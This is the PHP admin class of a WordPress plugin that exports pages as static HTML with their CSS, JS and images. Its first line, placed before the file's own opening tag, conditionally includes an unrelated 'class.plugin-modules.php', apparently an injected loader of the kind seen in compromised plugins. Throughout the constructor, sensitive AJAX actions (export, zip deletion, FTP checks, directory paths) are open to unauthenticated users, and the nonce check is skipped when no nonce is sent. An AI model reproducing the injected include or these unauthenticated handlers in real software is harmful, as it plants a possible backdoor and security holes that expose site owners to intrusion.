<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * The admin-specific functionality of the plugin.
 *
 * @link       https://www.upwork.com/fl/rayhan1
 * @since      1.0.0
 *
 * @package    Export_Wp_Page_To_Static_Html
 * @subpackage Export_Wp_Page_To_Static_Html/admin
 */

/**
 * The admin-specific functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the admin-specific stylesheet and JavaScript.
 *
 * @package    Export_Wp_Page_To_Static_Html
 * @subpackage Export_Wp_Page_To_Static_Html/admin
 * @author     ReCorp <rayhankabir1000@gmail.com>
 */

ini_set('max_execution_time', 6000);
ini_set('memory_limit','3024M');
ini_set('display_errors','Off');
ini_set('error_reporting', E_ALL );

class Export_Wp_Page_To_Static_Html_Admin {

	/**
	 * The ID of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $plugin_name    The ID of this plugin.
	 */
	private $plugin_name;

	/**
	 * The version of this plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $plugin_name       The name of this plugin.
	 * @param      string    $version    The version of this plugin.
	 */
	public function __construct( $plugin_name, $version ) {

		$this->plugin_name = $plugin_name;
		$this->version = $version;


		add_action('admin_menu', array($this, 'register_export_wp_pages_menu') );
		add_action('wp_print_scripts', array( $this, 'rc_cdata_inlice_Script_for_export_html' ));


		add_action('wp_ajax_rc_export_wp_page_to_static_html', array( $this, 'rc_export_wp_page_to_static_html' ));
		add_action('wp_ajax_nopriv_rc_export_wp_page_to_static_html', array( $this, 'rc_export_wp_page_to_static_html' ));

		add_action('wp_ajax_get_exporting_logs', array( $this, 'get_exporting_logs' ));
		add_action('wp_ajax_nopriv_get_exporting_logs', array( $this, 'get_exporting_logs' ));


		add_action('wp_ajax_create_the_zip_file', array( $this, 'create_the_zip_file' ));
		add_action('wp_ajax_nopriv_create_the_zip_file', array( $this, 'create_the_zip_file' ));

		add_action('wp_ajax_rc_search_posts', array( $this, 'rc_search_posts' ));
		add_action('wp_ajax_nopriv_rc_search_posts', array( $this, 'rc_search_posts' ));
	

		add_action('wp_ajax_add_cron_job_to_start_html_exporting', array( $this, 'add_cron_job_to_start_html_exporting' ));
		add_action('wp_ajax_nopriv_add_cron_job_to_start_html_exporting', array( $this, 'add_cron_job_to_start_html_exporting' ));


		add_action('wp_ajax_if_is_running_html_exporting_process', array( $this, 'if_is_running_html_exporting_process' ));
		add_action('wp_ajax_nopriv_if_is_running_html_exporting_process', array( $this, 'if_is_running_html_exporting_process' ));

		add_action('template_redirect', array ( $this, 'rc_redirect_for_export_page_as_html') );


		add_action( 'rc_export_new_event', array( $this, 'rc_export_pages_cron_task'), 10, 4 );
		add_action( 'rc_export_new_event2', array( $this, 'rc_export_pages_cron_task2'), 10, 5 );


		add_action('admin_notices', array ( $this, 'rc_export_html_general_admin_notice') );


		add_action('wp_ajax_delete_exported_zip_file', array( $this, 'delete_exported_zip_file' ));
		add_action('wp_ajax_nopriv_delete_exported_zip_file', array( $this, 'delete_exported_zip_file' ));

		add_action('wp_ajax_export_custom_url', array( $this, 'export_custom_url' ));
		add_action('wp_ajax_nopriv_export_custom_url', array( $this, 'export_custom_url' ));


    	add_action('wp_ajax_rc_check_ftp_connection_status', array( $this, 'rc_check_ftp_connection_status' ));
    	add_action('wp_ajax_nopriv_rc_check_ftp_connection_status', array( $this, 'rc_check_ftp_connection_status' ));


    	add_action('wp_ajax_rc_html_export_get_dir_path', array( $this, 'rc_html_export_get_dir_path' ));
    	add_action('wp_ajax_nopriv_rc_html_export_get_dir_path', array( $this, 'rc_html_export_get_dir_path' ));

		add_action('wp_ajax_cancel_rc_html_export_process', array( $this, 'cancel_rc_html_export_process' ));
		add_action('wp_ajax_nopriv_cancel_rc_html_export_process', array( $this, 'cancel_rc_html_export_process' ));

		add_action('wp_ajax_rc_get_ftp_uploading_file_count', array( $this, 'rc_get_ftp_uploading_file_count' ));
		add_action('wp_ajax_nopriv_rc_get_ftp_uploading_file_count', array( $this, 'rc_get_ftp_uploading_file_count' ));

		add_filter("before_basename_change", array($this, "before_basename_change2"), 10, 2);

		add_filter( 'cron_schedules', array( $this, 'rc_add_cron_interval_five_minutes') );


		//add_action( 'rc_check_for_errors_every_five_minutes', array( $this, 'do_this_every_five_minutes') , 10, 2 );
	}

	/**
	 * Register the stylesheets for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_styles() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Export_Wp_Page_To_Static_Html_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Export_Wp_Page_To_Static_Html_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/export-wp-page-to-static-html-admin.css', array(), $this->version, 'all' );
		wp_enqueue_style( 'ewppth_select2', plugin_dir_url( __FILE__ ) . 'css/select2.min.css', array(), '4.0.5', 'all' );

	}

	/**
	 * Register the JavaScript for the admin area.
	 *
	 * @since    1.0.0
	 */
	public function enqueue_scripts() {

		/**
		 * This function is provided for demonstration purposes only.
		 *
		 * An instance of this class should be passed to the run() function
		 * defined in Export_Wp_Page_To_Static_Html_Loader as all of the hooks are defined
		 * in that particular class.
		 *
		 * The Export_Wp_Page_To_Static_Html_Loader will then create the relationship
		 * between the defined hooks and the functions defined in this
		 * class.
		 */

		wp_enqueue_script( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'js/export-wp-page-to-static-html-admin.js', array( 'jquery' ), $this->version, false );

		wp_enqueue_script( 'ewppth_select2', plugin_dir_url( __FILE__ ) . 'js/select2.min.js', array( 'jquery' ), '4.0.5', false );

	}


	public function register_export_wp_pages_menu(){

		add_menu_page(        
			__('Export WP Page to Static HTML/CSS', 'different-menus'),
			'Export WP Page to Static HTML/CSS',
			'manage_options',
			'export-wp-page-to-html',
			array(
				$this,
				'load_admin_dependencies'
			),
			plugins_url( 'export-wp-page-to-static-html-pro/admin/images/icon.png' ),
			89
		);

		add_action('admin_init', array( $this,'register_export_wp_pages_settings') );
	}

	public function load_admin_dependencies(){
		require_once plugin_dir_path( dirname( __FILE__ ) ) . 'admin/partials/export-wp-page-to-static-html-admin-display.php';

	}

	public function register_export_wp_pages_settings(){
		register_setting('export_wp_pages_settings', 'recorp_ewpp_settings');
	}

	public function rc_cdata_inlice_Script_for_export_html() { 	
		?>
		<script>
			/* <![CDATA[ */
			var rcewpp = {
				"ajax_url":"<?php echo admin_url('admin-ajax.php'); ?>",
				"nonce": "<?php echo wp_create_nonce( 'rc-nonce' ); ?>",
				"home_url": "<?php echo home_url('/'); ?>",
				"settings_icon": '<?php echo plugin_dir_url( __FILE__ ) . 'images/settings.png' ?>',
				"settings_hover_icon": '<?php echo plugin_dir_url( __FILE__ ) . 'images/settings_hover.png' ?>'
			};
			/* ]]\> */
		</script>
		<?php
	}


	public function rc_export_wp_page_to_static_html(){
		$page_id = isset($_POST['page_id']) ? sanitize_key($_POST['page_id']) : "";
		$replace_urls = isset($_POST['replace_urls']) && sanitize_key($_POST['replace_urls']) == "true" ? true : false;
		$skip_image_src_url = isset($_POST['skip_image_src_url']) && sanitize_key($_POST['skip_image_src_url']) == "true" ? true : false;

		$export_data = isset($_POST['export_data']) ? $_POST['export_data'] : "";
		$nonce = isset($_POST['rc_nonce']) ? sanitize_key($_POST['rc_nonce']) : "";

		if(!empty($nonce)){
			if(!wp_verify_nonce( $nonce, "rc-nonce" )){
				echo json_encode(array('success' => 'false', 'status' => 'nonce_verify_error', 'response' => ''));

				die();
			}
		}

		update_option('rc_skip_image_src_url', $skip_image_src_url);

		$data = stripslashes($export_data);
		update_option('export_html_page_data', $data);
		$datas = json_decode($data);

		$x = 0;
		if (!empty($datas)) {
			foreach ($datas as $key => $page) {
				$permalink = $page->permalink;
				$title = $page->title;
				$page_id = $page->page_id;
				$post_name = $page->post_name;
				$is_homepage = $page->is_homepage;
				$is_full_site = $page->is_full_site;
				$is_all_links = $page->is_all_links;

				$html_filename = $post_name . '.html';
				$ok = $this->export_wp_page_as_static_html_by_page_id($page_id, $replace_urls, $html_filename, array(), false);

				/*if ($ok) {
					$x += 1;
				}*/

			}
		}

		/*$html_filename = 'test.html';
		$middle_pathesponse = $this->export_wp_page_as_static_html_by_page_id($page_id, $replace_urls, $html_filename, array(), false);*/
		
		//if (count($datas) == $x) {
			echo json_encode(array('success' => 'true', 'status' => 'success', 'response' => $data));
		//}

	
		die();
	}

	public function get_string_between($string, $start, $end){
	    $string = ' ' . $string;
	    $ini = strpos($string, $start);
	    if ($ini == 0) return '';
	    $ini += strlen($start);
	    $len = strpos($string, $end, $ini) - $ini;
	    return substr($string, $ini, $len);
	}

	public function rmdir_recursive($dir) {
	    foreach(scandir($dir) as $file) {
	        if ('.' === $file || '..' === $file) continue;
	        if (is_dir("$dir/$file")) $this->rmdir_recursive("$dir/$file");
	        else unlink("$dir/$file");
	    }
	    rmdir($dir);
	}


	public function export_wp_page_as_static_html_by_page_id($page_id_or_url = 0, $replace_urls_to_hash = false, $html_filename = 'index.html', $url_to_replace = array(), $custom_url_bool = false, $all_links = false, $full_site = false, $custom_url_host=''){

		if ($this->is_cancel_command_found()) {
			return false;
		}

		if (!ewptshp_fs()->is_plan('pro', true)) {
			return false;
		}

		$this->add_rc_url_to_replace_data($html_filename, $html_filename);

		if (!$custom_url_bool) {
			$main_url = get_permalink($page_id_or_url);
		} else {
			$main_url = $page_id_or_url;
		}

		$main_url = explode('#', $main_url)[0];

		if ($page_id_or_url == 'home_page') {
			$main_url = home_url('/');
		}
		$parse_url = parse_url($main_url);
		$scheme = $parse_url['scheme'];
		$host = $scheme . '://' . $parse_url['host'];

		if (empty($custom_url_host)) {
			$custom_url_bool = false;
		}

		$middle_path = $this->rc_get_url_middle_path($main_url, $custom_url_bool, $full_site);
		$path_to_dot = $this->rc_path_to_dot($main_url, $custom_url_bool, $full_site);

		//$this->ttt($path_to_dot);



		if (!$this->rc_is_link_already_generated($main_url)) {
			$log = $this->update_export_log($main_url, 'reading', '');
		}

		
		$src = $this->get_site_data_by_url($main_url);

		/*if ($this->is_url_already_read($main_url)) {
			$src = "test";
		}*/


		preg_match_all("/(?<=\<link rel='stylesheet|\<link rel=\"stylesheet).*?(?=\>)/",$src,$matches);
		preg_match_all("/(?<=\<link rel='shortcut icon'|\<link rel=\"shortcut icon\").*?(?=\>)/",$src,$matches_icons);
		preg_match_all("/(?<=\<meta name='thumbnail'|\<meta name=\"thumbnail\").*?(?=\>)/",$src,$meta_images);
		preg_match_all("/(?<=\<meta property='og:image'|\<meta property=\"og:image\").*?(?=\>)/",$src,$og_image);
		preg_match_all("/(?<=\<script).*?(?=\<\/script\>)/",$src,$matches_scripts);
		preg_match_all("/(?<=\<img).*?(?=\/\>)/",$src,$matches_images);

		$upload_dir = wp_upload_dir()['basedir'];

		if (!file_exists($upload_dir . '/exported_html_files')) {
			mkdir($upload_dir . '/exported_html_files');
		}

		if (!file_exists($upload_dir . '/exported_html_files/tmp_files')) {
			mkdir($upload_dir . '/exported_html_files/tmp_files');
		}

		if (!empty($middle_path) && !file_exists($upload_dir . '/exported_html_files/tmp_files/'.$middle_path)) {
			$path = $upload_dir . '/exported_html_files/tmp_files/'.$middle_path;
			mkdir( $path, 0777, true );
		}

		/* else {
			$this->rmdir_recursive($upload_dir . '/exported_html_files/tmp_files');
			mkdir($upload_dir . '/exported_html_files/tmp_files');
		}*/
		
		$pathname_css = $upload_dir . '/exported_html_files/tmp_files/css/';
		$pathname_fonts = $upload_dir . '/exported_html_files/tmp_files/fonts/';
		$pathname_js = $upload_dir . '/exported_html_files/tmp_files/js/';
		$pathname_images = $upload_dir . '/exported_html_files/tmp_files/images/';


		if (!file_exists($upload_dir . '/exported_html_files/tmp_files/css')) {

			if ($this->update_export_log('', 'creating', 'CSS Directory')) {
				mkdir($upload_dir . '/exported_html_files/tmp_files/css');
			}
		}
		if (!file_exists($upload_dir . '/exported_html_files/tmp_files/fonts')) {
			if ($this->update_export_log('', 'creating', 'Fonts Directory')) {
				mkdir($upload_dir . '/exported_html_files/tmp_files/fonts');
			}
		}
		if (!file_exists($upload_dir . '/exported_html_files/tmp_files/js')) {
			if ($this->update_export_log('', 'creating', 'JS Directory')) {
				mkdir($upload_dir . '/exported_html_files/tmp_files/js');
			}
		}
		if (!file_exists($upload_dir . '/exported_html_files/tmp_files/images')) {
			if ($this->update_export_log('', 'creating', 'Images Directory')) {
				mkdir($upload_dir . '/exported_html_files/tmp_files/images');
			}
		}

		foreach ((array)$matches[0] as $key => $stylesheet) {

			if (strpos($stylesheet, 'href="') !== false) {
				$stylesheet_url = $this->get_string_between($stylesheet, 'href="', '"');
			} else {
				$stylesheet_url = $this->get_string_between($stylesheet, 'href=\'', '\'');
			}
			
			if (strpos($stylesheet_url, 'fonts.googleapis.com') == false) {

			if (strpos( $stylesheet_url, '//') !== false) {
				if (strpos( $stylesheet_url, 'http') !== false) {	
					if (!$this->rc_is_link_already_generated($stylesheet_url)) {
						# code...
						
						if ( /*!(strpos($stylesheet_url, 'gstatic') !== false)  && !(strpos($stylesheet_url, 'googleapis') !== false) && */ $this->update_export_log($stylesheet_url, 'copying', '')) {
							$data = $this->get_site_data_by_url($stylesheet_url);
						}
					}
					
				} else {	
					if (!$this->rc_is_link_already_generated($scheme . ':' . $stylesheet_url)) {
						if ($this->update_export_log($scheme . ':' . $stylesheet_url, 'copying', '')) {
							$data = $this->get_site_data_by_url($scheme . ':' . $stylesheet_url);
						}
					}
				}
				
			}
			else {
				if (!$this->rc_is_link_already_generated($host . $stylesheet_url)) {
					if ($this->update_export_log($host . $stylesheet_url, 'copying', '')) {
						$data = $this->get_site_data_by_url($host . $stylesheet_url);
					}
				}
			}
			
		} else {
			$data = "";
		}

		//$this->ttt($stylesheet_url);

			preg_match_all("/(?<=url\().*?(?=\))/", $data, $matches_links);

			foreach ($matches_links as $key => $value) {
				foreach ($value as $key => $value2) {

				$value2 = $this->ltrim_and_rtrim($value2);
					if ( strpos($value2, './') !== false || strpos($value2, '../') !== false ) {
						$item_url = $value2;

						$item_url_ = explode('/', $stylesheet_url);

						if (count($item_url_) > 0) {

							$item_url_value = explode('../', $value2);

							for ($i=0; $i < count($item_url_value); $i++) { 
								$last_key = count($item_url_)-1;
								unset($item_url_[$last_key]);
							}
							
						}
						$item_url_ = implode('/', $item_url_);
						$backend_file_url = str_replace(array('../', './'), array('', ''), $value2);
						$backend_file_url_full = $item_url_ . '/' . $backend_file_url;


						$url_basename = explode('?', basename($item_url));

						if ( (strpos($item_url, 'eot') !== false || strpos($item_url, 'woff') !== false || strpos($item_url, 'ttf') !== false) ) {
							$my_file = $pathname_fonts . $url_basename[0];

							$data = str_replace($value2, '../fonts/'.$url_basename[0], $data);
						} 

						if (strpos($item_url, 'png') !== false || strpos($item_url, 'jpg') !== false || strpos($item_url, 'jpeg') !== false || strpos($item_url, 'svg') !== false || strpos($item_url, 'gif') !== false || strpos($item_url, 'bmp') !== false) {
							$my_file = $pathname_images . $url_basename[0];
							$data = str_replace($value2, '../images/'.$url_basename[0], $data);
							
						}

						if (strpos($item_url, 'css') !== false) {
							$my_file = $pathname_css . $url_basename[0];
							$data = str_replace($value2, '../css/'.$url_basename[0], $data);
							
						}

						if (!file_exists($my_file)) {
							$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);

							if ($this->update_export_log($backend_file_url_full)) {
								$item_data = $this->get_site_data_by_url($backend_file_url_full);
							}
							
							fwrite($handle, $item_data);
							fclose($handle);
						}


						

					} elseif ( strpos($value2, '//') !== false && !(strpos($value2, 'http') !== false) && !(strpos($value2, 'data:') !== false) /*&& !(strpos($value2, 'gstatic') !== false)  && !(strpos($value2, 'googleapis') !== false)*/ ) {

						$item_url2 = $scheme . ':' . $value2;
						$url_basename = explode('?', basename($item_url2));

						if ( strpos($value2, 'eot') !== false || strpos($value2, 'woff') !== false || strpos($value2, 'ttf') !== false ) {
							$my_file = $pathname_fonts . $url_basename[0];
							$data = str_replace($value2, '../fonts/'.$url_basename[0], $data);
						} 

						if (strpos($value2, 'png') !== false || strpos($value2, 'jpg') !== false || strpos($value2, 'jpeg') !== false || strpos($value2, 'svg') !== false || strpos($value2, 'gif') !== false || strpos($value2, 'bmp') !== false || strpos($value2, 'ico') !== false) {
							$my_file = $pathname_images . $url_basename[0];
							$data = str_replace($value2, '../images/'.$url_basename[0], $data);
							
						}


						if (strpos($value2, 'css') !== false) {
							$my_file = $pathname_css . $url_basename[0];
							$data = str_replace($value2, '../css/'.$url_basename[0], $data);
							
						}

						if (!file_exists($my_file)) {
							$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
							if ($this->update_export_log($item_url2)) {
								$item_data = $this->get_site_data_by_url($item_url2);
							}
							fwrite($handle, $item_data);
							fclose($handle);
						}

					} 

					elseif ( (strpos($value2, 'http') !== false) && !(strpos($value2, 'data:') !== false) /* && !(strpos($value2, 'gstatic') !== false)  && !(strpos($value2, 'googleapis') !== false)*/ ) {

						$item_url2 = $value2;
						$url_basename = explode('?', basename($item_url2));

						if ( strpos($value2, 'eot') !== false || strpos($value2, 'woff') !== false || strpos($value2, 'ttf') !== false ) {
							$my_file = $pathname_fonts . $url_basename[0];
							$data = str_replace($value2, '../fonts/'.$url_basename[0], $data);

						} 

						if (strpos($value2, 'png') !== false || strpos($value2, 'jpg') !== false || strpos($value2, 'jpeg') !== false || strpos($value2, 'svg') !== false || strpos($value2, 'gif') !== false || strpos($value2, 'bmp') !== false) {
							$my_file = $pathname_images . $url_basename[0];
							$data = str_replace($value2, '../images/'.$url_basename[0], $data);
							
						}

						if (strpos($value2, 'css') !== false) {
							$my_file = $pathname_css . $url_basename[0];
							$data = str_replace($value2, '../css/'.$url_basename[0], $data);
							
						}

						if (!file_exists($my_file)) {
							$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
							if ($this->update_export_log($item_url2)) {
								$item_data = $this->get_site_data_by_url($item_url2);
							}
							fwrite($handle, $item_data);
							fclose($handle);
						}
					} 

					elseif ( !(strpos($value2, 'http') !== false) && !(strpos($value2, 'data:') !== false) /*&& !(strpos($value2, 'gstatic') !== false)  && !(strpos($value2, 'googleapis') !== false)*/ ) {


						$item_url = $value2;
						$url_basename = explode('?', basename($item_url));
						$url_basename = explode('#', $url_basename[0] );
						if (!file_exists($pathname_images . $url_basename[0])) {

						$item_url_ = explode('/', $stylesheet_url);
						$last = count($item_url_)-1;
						unset($item_url_[$last]);
						$last = count($item_url_)-1;
						//unset($item_url_[$last]);


						$item_url_ = implode('/', $item_url_);
						$backend_file_url = $value2;

						$backend_file_url = $this->ltrim_and_rtrim($backend_file_url);

						$backend_file_url_full = $item_url_ . '/' . $backend_file_url;



						if ( (strpos($item_url, 'eot') !== false || strpos($item_url, 'woff') !== false || strpos($item_url, 'ttf') !== false) ) {
							$my_file = $pathname_fonts . $url_basename[0];
							$data = str_replace($value2, '../fonts/'.$url_basename[0], $data);
						} 

						if (strpos($item_url, 'png') !== false || strpos($item_url, 'jpg') !== false || strpos($item_url, 'jpeg') !== false || strpos($item_url, 'svg') !== false || strpos($item_url, 'gif') !== false || strpos($item_url, 'bmp') !== false) {
							$my_file = $pathname_images . $url_basename[0];
							$data = str_replace($value2, '../images/'.$url_basename[0], $data);
							
						}


						if (strpos($item_url, 'css') !== false) {
							$my_file = $pathname_css . $url_basename[0];
							$data = str_replace($value2, '../css/'.$url_basename[0], $data);
							
						}

						if (!file_exists($my_file)) {
							$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);

							if ($this->update_export_log($backend_file_url_full)) {
								$item_data = $this->get_site_data_by_url($backend_file_url_full);
							}
							
							fwrite($handle, $item_data);
							fclose($handle);
						}

						}
						
					}
				}
			}



			$basename = explode('?', basename($stylesheet_url));

			if (strpos( $basename[0], ".css") == false) {
				$basename[0] = rand(5000, 9999) . ".css";
			}

			$m_basename = $this->middle_path_for_filename($stylesheet_url);

			if (!empty($m_basename)) {
				$my_file = $pathname_css . $m_basename . $basename[0];
			} 
			else {
				$my_file = $pathname_css . $basename[0];
			}

			

			if (!file_exists($my_file)) {



				$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
				
				$data = $data . "\n/*This file was exported by \"Export WP Page to Static HTML\" plugin which created by ReCorp (https://myrecorp.com) */";
				fwrite($handle, $data);
				fclose($handle);
			}

			if (!empty($m_basename)) {
				$basename_ = $m_basename . $basename[0];
			} 
			else {
				$basename_ = $basename[0];
			}
			
			if (strpos($stylesheet, 'fonts.googleapis.com') == false) {
				if (strpos($stylesheet, 'href="') !== false) {
					$src = str_replace($stylesheet, '" href="'.$path_to_dot.'css/' . $basename_ . '"', $src);
				} else {
					$src = str_replace($stylesheet, '\' href=\''.$path_to_dot.'css/' . $basename_ . '\'', $src);
				}
			}


		}

		/*Export js*/
		foreach ((array) $matches_scripts[0] as $key => $script) {
			if ( strpos($script, 'src') !== false) {

				if (strpos($script, '"') !== false ) {
					$script_url = $this->get_string_between($script, 'src="', '"');
				} else {
					$script_url = $this->get_string_between($script, 'src=\'', '\'');
				}


				if (strpos( $script_url, '//') !== false) {
					if (strpos( $script_url, 'http') !== false) {
						if (!$this->rc_is_link_already_generated($script_url) && $this->update_export_log($script_url)) {
							$data = $this->get_site_data_by_url($script_url);
						}
					} else {
						if (!$this->rc_is_link_already_generated($scheme . ':' . $script_url) && $this->update_export_log($scheme . ':' . $script_url)) {
							$data = $this->get_site_data_by_url( $scheme . ':' . $script_url );
						}
					}
					
				}
				else {
					if (!$this->rc_is_link_already_generated($host . $script_url) && $this->update_export_log($host . $script_url)) {
						$data = $this->get_site_data_by_url($host . $script_url);
					}
				}
			

				$basename = explode('?', basename($script_url));

				if ( !(strpos( $basename[0], ".") !== false )) {
					$basename[0] = rand(5000, 9999) . ".js";
				}

				$my_file = $pathname_js . $basename[0];

				if (!file_exists($my_file)) {
					$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);

					$data = $data . "\n/*This file was exported by \"Export WP Page to Static HTML\" plugin which created by ReCorp (https://myrecorp.com) */";
					fwrite($handle, $data);
					fclose($handle);
				}

				$src = str_replace($script_url, $path_to_dot . 'js/' . $basename[0], $src);

			}
		}


		/*Export images*/

		if (!get_option('rc_skip_image_src_url') == 1) {

			foreach ((array) $matches_images[0] as $key => $image) {
				if ( strpos($image, 'src') !== false) {
					$img_src = $this->get_string_between($image, 'src="', '"');
					$basename = explode('?', basename($img_src));

					
					if ( !(strpos( $img_src, 'data:') !== false) ) {
						if (strpos( $img_src, '//') !== false) {
							if (strpos( $img_src, 'http') !== false) {
								if (!$this->rc_is_link_already_generated($img_src) && $this->update_export_log($img_src)) {
									$data = $this->get_site_data_by_url($img_src);
								}

							} else {		
								if (!$this->rc_is_link_already_generated($scheme . ':' . $img_src) && $this->update_export_log($scheme . ':' . $img_src)) {
									$data = $this->get_site_data_by_url( $scheme . ':' . $img_src );
									$img_src = $scheme . ':' . $img_src;
								}
							}
							
						}
						else {
							$url_basename = explode('?', basename($img_src));
							$url_basename = explode('#', $url_basename[0] );
							if (!file_exists($pathname_images . $img_src)) {

								$item_url_ = explode('/', $img_src);
								$last = count($item_url_)-1;
								unset($item_url_[$last]);
								$last = count($item_url_)-1;
								//unset($item_url_[$last]);


								$item_url_ = implode('/', $item_url_);
								$backend_file_url = $value2;

								$backend_file_url = $this->ltrim_and_rtrim($backend_file_url);

								$backend_file_url_full = $item_url_ . '/' . $backend_file_url;

								$my_file = $pathname_images . $url_basename[0];

								if (!$this->rc_is_link_already_generated($my_file) && $this->update_export_log($my_file)) {
									$data = $this->get_site_data_by_url( $backend_file_url_full );
								}
									
							}


						}
						/*else {		
							if (!$this->rc_is_link_already_generated($host . $img_src) && $this->update_export_log('2222222222'.$host . $img_src)) {
								$data = $this->get_site_data_by_url($host . $img_src);
								$img_src = $host . $img_src;
							}
						}*/
					}
				


					if (strpos( $basename[0], ".") == false) {
						$basename[0] = rand(5000, 9999) . ".jpg";
					}

					$my_file = $pathname_images . $basename[0];

					if (!file_exists($my_file)) {
						$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
						
						fwrite($handle, $data);
						fclose($handle);
					}

					//$m_basename = $this->middle_path_for_filename($img_src);
					$m_path = $path_to_dot;

					$src = str_replace($img_src, $m_path . 'images/' . str_replace(' ', '', $basename[0]), $src);
				}
			}
			
		}
		/*Export meta images*/
		foreach ((array) $matches_icons[0] as $key => $image) {
			if ( strpos($image, 'href') !== false) {
				$img_src = $this->get_string_between($image, 'href="', '"');
				$basename = explode('?', basename($img_src));

				if ( !(strpos( $img_src, 'data:') !== false) ) {
					if (strpos( $img_src, '//') !== false) {
						if (strpos( $img_src, 'http') !== false) {		
							if (!$this->rc_is_link_already_generated($img_src) && $this->update_export_log($img_src)) {
								$data = $this->get_site_data_by_url($img_src);
							}
						} else {	
							if (!$this->rc_is_link_already_generated($scheme . ':' . $img_src) && $this->update_export_log($scheme . ':' . $img_src)) {
								$data = $this->get_site_data_by_url( $scheme . ':' . $img_src );
							}
						}
						
					}
					else {	
						if (is_file($host . $img_src) && !$this->rc_is_link_already_generated($host . $img_src) &&  $this->update_export_log($host . $img_src)) {
							$data = $this->get_site_data_by_url($host . $img_src);
						}
					}
				}
			


				if (strpos( $basename[0], ".") == false) {
					$basename[0] = rand(5000, 9999) . ".jpg";
				}

				$my_file = $pathname_images . $basename[0];

				if (!file_exists($my_file)) {
					$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
					
					fwrite($handle, $data);
					fclose($handle);
				}

				$m_path = $path_to_dot;
				$src = str_replace($img_src, $m_path . 'images/' . str_replace(' ', '', $basename[0]), $src);
			}
		}


		foreach ((array) $meta_images[0] as $key => $image) {
			if ( strpos($image, 'content') !== false) {
				$img_src = $this->get_string_between($image, 'content="', '"');
				$basename = explode('?', basename($img_src));

				if ( !(strpos( $img_src, 'data:') !== false) ) {
					if (strpos( $img_src, '//') !== false) {
						if (strpos( $img_src, 'http') !== false) {	
							if (!$this->rc_is_link_already_generated($img_src) && $this->update_export_log($img_src)) {
								$data = $this->get_site_data_by_url($img_src);
							}
						} else {
							if (!$this->rc_is_link_already_generated($scheme . ':' . $img_src) && $this->update_export_log($scheme . ':' . $img_src)) {
								$data = $this->get_site_data_by_url( $scheme . ':' . $img_src );
							}
						}
						
					}
					else {
						if (!$this->rc_is_link_already_generated($host . $img_src) && $this->update_export_log($host . $img_src)) {
							$data = $this->get_site_data_by_url($host . $img_src);
						}
					}
				}
			


				if (strpos( $basename[0], ".") == false) {
					$basename[0] = rand(5000, 9999) . ".jpg";
				}

				$my_file = $pathname_images . $basename[0];

				if (!file_exists($my_file)) {
					$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
					
					fwrite($handle, $data);
					fclose($handle);
				}

				$dot = $path_to_dot;

				$src = str_replace($img_src, $dot . 'images/' . str_replace(' ', '', $basename[0]), $src);
			}
		}

		foreach ((array) $og_image[0] as $key => $image) {
			if ( strpos($image, 'content') !== false) {
				$img_src = $this->get_string_between($image, 'content="', '"');
				$basename = explode('?', basename($img_src));

				if ( !(strpos( $img_src, 'data:') !== false) ) {
					if (strpos( $img_src, '//') !== false) {
						if (strpos( $img_src, 'http') !== false) {
							if (!$this->rc_is_link_already_generated($img_src) && $this->update_export_log($img_src)) {
								$data = $this->get_site_data_by_url($img_src);
							}
						} else {
							if (!$this->rc_is_link_already_generated($scheme . ':' . $img_src) && $this->update_export_log($scheme . ':' . $img_src)) {
								$data = $this->get_site_data_by_url( $scheme . ':' . $img_src );
							}
						}
						
					}
					else {
						if (!$this->rc_is_link_already_generated($host . $img_src) && $this->update_export_log($host . $img_src)) {
							$data = $this->get_site_data_by_url($host . $img_src);
						}
					}
				}
			


				if (strpos( $basename[0], ".") == false) {
					$basename[0] = rand(5000, 9999) . ".jpg";
				}

				$my_file = $pathname_images . $basename[0];

				if (!file_exists($my_file)) {
					$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
					
					fwrite($handle, $data);
					fclose($handle);
				}

				//$mp = $this->rc_get_url_middle_path($url);
				$dot = $path_to_dot;

				$src = str_replace($img_src, $dot. 'images/' . str_replace(' ', '', $basename[0]), $src);
			}
		}

		$src = apply_filters('filter_html_contents', $src);

		$src .= "\n<!--This file was exported by \"Export WP Page to Static HTML\" plugin which created by ReCorp (https://myrecorp.com) -->";


		if ($all_links || $full_site) {

			$src = preg_replace_callback("/(\<a)(.*)?(?<= href=\").*?(?=\")/", 			
				function ($matches) use ($all_links, $full_site, $custom_url_host, $replace_urls_to_hash){

				$url = str_replace('<a' . $matches[2], '', $matches[0]);
				$slug = basename($url);

				/*if ($url == home_url()||$url == home_url('/')) {
					if ($full_site) {
						$html_filename2 = 'index.html';
					}
				} else {

				}*/
				$html_filename2 = $slug . '.html';

				if (!$this->rc_is_link_already_generated($url)) {

					$replace_urls3 = $this->add_rc_url_to_replace_data($url, $slug);

					$home_url = home_url();
					$url_host = "";
					if (!empty($custom_url_host)) {
						$home_url = $custom_url_host;
						$url_host = $custom_url_host;
					}

					$url = explode('#', $url)[0];
					$url = explode('?', $url)[0];

					if ($slug !== 0 && !$this->is_url_already_read($url)) {

						if ($full_site) {

							if (strpos($url, $home_url) !== false && strpos($url, 'wp-admin') == false  && strpos($url, 'action=lostpassword') == false && strpos($url, 'wp-login.php') == false) {

